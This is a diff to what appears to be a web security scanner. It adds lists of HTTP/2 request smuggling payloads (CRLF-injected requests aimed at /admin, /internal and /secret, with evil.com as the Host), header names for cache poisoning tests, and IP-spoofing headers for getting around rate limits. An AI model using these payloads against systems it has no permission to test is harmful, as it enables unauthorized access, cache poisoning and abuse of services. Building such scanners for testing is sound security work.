@@ -2233,6 +2233,50 @@ class Payloads:
         "table",
     ]
 
+    # HTTP/2 Smuggling Payloads - pseudo-header injection strings
+    H2_SMUGGLING_PAYLOADS = [
+        "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n",
+        "/admin\r\nHost: evil.com",
+        "/ HTTP/1.1\r\nX-Injected: true\r\nHost: evil.com\r\n\r\nGET /admin",
+        "GET /internal HTTP/1.1\r\n\r\n",
+        "\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
+        ":method GET\r\n:path /admin\r\n:authority evil.com",
+        "/ HTTP/1.1\r\nContent-Length: 0\r\n\r\nPOST /admin HTTP/1.1",
+        "\r\nHost: internal.service\r\n\r\nGET /secret",
+    ]
+
+    # Cache Poisoning Headers - unkeyed header names to test
+    CACHE_POISONING_HEADERS = [
+        "X-Forwarded-Host",
+        "X-Original-URL",
+        "X-Rewrite-URL",
+        "X-Forwarded-Scheme",
+        "X-Forwarded-Proto",
+        "X-Host",
+        "X-Forwarded-Server",
+        "X-HTTP-Method-Override",
+        "X-Forwarded-Port",
+        "X-Forwarded-Prefix",
+        "X-Original-Host",
+        "X-Backend-Host",
+    ]
+
+    # API Abuse Rate Limit Bypass Headers - IP spoofing headers
+    API_ABUSE_RATE_LIMIT_HEADERS = [
+        "X-Forwarded-For",
+        "X-Real-IP",
+        "X-Originating-IP",
+        "X-Client-IP",
+        "X-Remote-IP",
+        "X-Remote-Addr",
+        "X-Forwarded",
+        "Forwarded-For",
+        "True-Client-IP",
+        "CF-Connecting-IP",
+        "X-ProxyUser-IP",
+        "X-Original-Forwarded-For",
+    ]
+
 
 class Colors:
     """Terminal Colors"""
